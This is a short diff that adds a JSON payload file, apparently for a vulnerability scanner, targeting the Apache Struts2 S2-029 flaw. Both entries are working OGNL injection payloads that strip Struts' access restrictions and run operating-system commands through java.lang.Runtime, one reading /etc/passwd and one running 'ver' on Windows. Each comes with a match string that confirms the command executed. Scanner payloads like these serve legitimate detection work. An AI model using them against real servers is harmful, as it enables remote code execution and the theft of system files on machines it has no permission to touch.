@@ -1,0 +1,15 @@
+[
+  {
+        "type": "s2-029",
+        "payload": [
+            {
+                "payload": "'),#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#a=@java.lang.Runtime@getRuntime(),#a.exec('cat /etc/passwd'),new java.lang.String('",
+                "match": "root:"
+            },
+            {
+                "payload": "'),#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#a=@java.lang.Runtime@getRuntime(),#a.exec('ver'),new java.lang.String('",
+                "match": "Microsoft Windows"
+            }
+        ]
+  }
+]
